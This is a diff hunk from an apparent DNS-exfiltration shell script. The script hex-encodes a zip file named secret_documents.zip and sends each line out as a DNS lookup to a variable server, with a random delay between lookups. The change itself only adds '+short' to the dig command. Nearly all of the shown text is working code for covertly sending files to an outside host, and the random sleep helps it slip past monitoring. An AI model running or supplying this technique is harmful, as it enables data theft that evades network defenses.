@@ -26,7 +26,7 @@ xxd -p secret_documents.zip >  secret_documents.hex
 # upload each line as queries to your server
 for line in $(cat secret_documents.hex)
 do
-dig $line.${SERVER}
+dig $line.${SERVER} +short
 sleep $[ ( $RANDOM % 20 )  + 1 ]s
 done
 
